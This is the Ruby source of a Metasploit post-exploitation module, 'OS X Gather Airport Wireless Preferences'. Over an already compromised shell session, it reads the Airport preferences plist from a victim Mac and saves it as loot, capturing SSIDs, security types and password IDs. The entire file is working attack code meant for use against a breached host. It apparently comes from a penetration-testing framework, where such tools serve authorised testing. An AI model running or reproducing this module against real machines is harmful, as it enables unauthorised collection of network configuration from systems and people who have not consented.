##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# Framework web site for more information on licensing and terms of use.
##

require 'msf/core'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'OS X Gather Airport Wireless Preferences',
      'Description'   => %q{
          This module will download OS X Airport Wireless preferences from the victim
        machine.  The preferences file (which is a plist) contains information such as:
        SSID, Channels, Security Type, Password ID, etc.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'sinn3r'],
      'Platform'      => [ 'osx' ],
      'SessionTypes'  => [ "shell" ]
    ))
  end

  def exec(cmd)
    tries = 0
    begin
      out = cmd_exec(cmd).chomp
    rescue ::Timeout::Error => e
      tries += 1
      if tries < 3
        vprint_error("#{@peer} - #{e.message} - retrying...")
        retry
      end
    rescue EOFError => e
      tries += 1
      if tries < 3
        vprint_error("#{@peer} - #{e.message} - retrying...")
        retry
      end
    end
  end


  def get_air_preferences
    pref = exec("cat /Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist")
    return pref =~ /No such file or directory/ ? nil : pref
  end

  def save(data)
    p = store_loot(
      "apple.airport.preferences",
      "plain/text",
      session,
      data,
      "com.apple.airport.preferences.plist")

    print_good("#{@peer} - plist saved in #{p}")
  end

  def run
    @peer = "#{session.session_host}:#{session.session_port}"

    # Download the plist.  If not found (nil), then bail
    pref = get_air_preferences
    if pref.nil?
      print_error("#{@peer} - Unable to find airport preferences")
      return
    end

    # Save the raw version of the plist
    save(pref)
  end

end
